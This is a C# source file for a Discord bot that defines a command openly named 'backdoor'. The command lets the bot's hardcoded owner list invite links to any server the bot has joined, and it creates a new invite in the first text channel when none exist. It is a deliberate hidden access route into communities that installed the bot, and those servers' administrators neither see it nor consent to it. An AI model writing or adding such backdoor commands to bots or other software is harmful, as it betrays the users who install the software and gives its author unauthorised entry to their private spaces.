using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;
using rJordanBot.Resources.Settings;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace rJordanBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (Context.User.Id != ESettings.Owner) return;
            if (!(Context.User.Id == 192824985281101825))
            {
                await Context.Channel.SendMessageAsync(":x: Permission denied: You are not a bot moderator.");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with ID = " + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            IReadOnlyCollection<RestInviteMetadata> Invites = await Guild.GetInvitesAsync();
            if (Invites.Count < 1)
            {
                await Guild.TextChannels.First().CreateInviteAsync();
            }
            Invites = null;
            Invites = await Guild.GetInvitesAsync();
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for Guild {Guild.Name}", Guild.IconUrl);
            Embed.WithColor(40, 200, 150);
            foreach (RestInviteMetadata Current in Invites)
            {
                Embed.AddField("Invite: ", $"[Invite]({Current.Url})");
            }
            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
    }
}
